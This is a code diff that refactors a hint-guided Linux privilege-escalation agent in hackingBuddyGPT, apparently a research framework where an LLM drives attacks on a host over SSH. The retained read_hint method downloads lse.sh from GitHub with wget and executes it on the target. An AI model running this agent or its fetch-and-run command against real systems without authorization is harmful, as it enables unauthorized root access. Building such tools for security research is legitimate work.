@@ -7,9 +7,7 @@ from hackingBuddyGPT.capabilities import SSHRunCommand, SSHTestCredential
 from hackingBuddyGPT.usecases.agents import Agent
 from .common import Privesc
 from hackingBuddyGPT.utils import SSHConnection
-from hackingBuddyGPT.usecases.base import use_case, UseCase
-from hackingBuddyGPT.utils.console.console import Console
-from hackingBuddyGPT.utils.db_storage.db_storage import DbStorage
+from hackingBuddyGPT.usecases.base import use_case
 from hackingBuddyGPT.utils.openai.openai_llm import OpenAIConnection
 
 template_dir = pathlib.Path(__file__).parent / "templates"
@@ -73,34 +71,57 @@ class PrivescWithHintFile(Agent):
 
 @use_case("linux_privesc_guided", "Linux Privilege Escalation using lse.sh for initial guidance")
 @dataclass
-class PrivescWithLSE(UseCase):
+class PrivescWithLSE(Agent):
     conn: SSHConnection = None
     system: str = ''
     enable_explanation: bool = False
     enable_update_state: bool = False
     disable_history: bool = False
-
-    # all of these would typically be set by RoundBasedUseCase :-/
-    # but we need them here so that we can pass them on to the inner
-    # use-case
-    log_db: DbStorage = None
-    console: Console = None
-    llm: OpenAIConnection = None
-    tag: str = ""
-    max_turns: int = 10
     low_llm: OpenAIConnection = None
+
+    _agent: Agent = None
+    _turns_per_hint:int = 20
 
     def init(self):
         super().init()
+    
+    def perform_round(self, turn: int) -> bool:
+        if turn == 1:
+            self._hints = self.read_hint().splitlines()
+            self._turns_per_hint = int(self.max_turns / len(self._hints))
+
+        if turn % self._turns_per_hint == 1:
+            hint_pos = int(turn / self._turns_per_hint)
+
+            if hint_pos < len(self._hints):
+                i = self._hints[hint_pos]
+                self.console.print("[green]Now using Hint: " + i)
+            
+                # call the inner use-case
+                self._agent = LinuxPrivesc(
+                    conn=self.conn, # must be set in sub classes
+                    enable_explanation=self.enable_explanation,
+                    disable_history=self.disable_history,
+                    hint=i,
+                    log_db = self.log_db,
+                    console = self.console,
+                    llm = self.low_llm,
+                    tag = self.tag + "_hint_" +i,
+                    max_turns = self.max_turns
+                )
+
+                self._agent.init()
+                self._agent.setup()
+
+        return self._agent.perform_round(turn)
 
     # simple helper that uses lse.sh to get hints from the system
     def read_hint(self):
-        
         self.console.print("[green]performing initial enumeration with lse.sh")
 
         run_cmd = "wget -q 'https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh' -O lse.sh;chmod 700 lse.sh; ./lse.sh -c -i -l 0 | grep -v 'nope$' | grep -v 'skip$'"
 
-        result, got_root = SSHRunCommand(conn=self.conn, timeout=120)(run_cmd)
+        result, _ = SSHRunCommand(conn=self.conn, timeout=120)(run_cmd)
 
         self.console.print("[yellow]got the output: " + result)
         cmd = self.llm.get_response(template_lse, lse_output=result, number=3)
@@ -108,30 +129,6 @@ class PrivescWithLSE(UseCase):
 
         return cmd.result
 
-    def run(self):
-        # read the hint
-        hint = self.read_hint()
-
-        for i in hint.splitlines():
-            self.console.print("[green]Now using Hint: " + i)
-         
-            # call the inner use-case
-            priv_esc = LinuxPrivesc(
-                conn=self.conn, # must be set in sub classes
-                enable_explanation=self.enable_explanation,
-                disable_history=self.disable_history,
-                hint=i,
-                log_db = self.log_db,
-                console = self.console,
-                llm = self.low_llm,
-                tag = self.tag + "_hint_" +i,
-                max_turns = self.max_turns
-            )
-
-            priv_esc.init()
-            if priv_esc.run():
-                # we are root! w00t!
-                return True
 
 @use_case("linux_privesc", "Linux Privilege Escalation")
 @dataclass
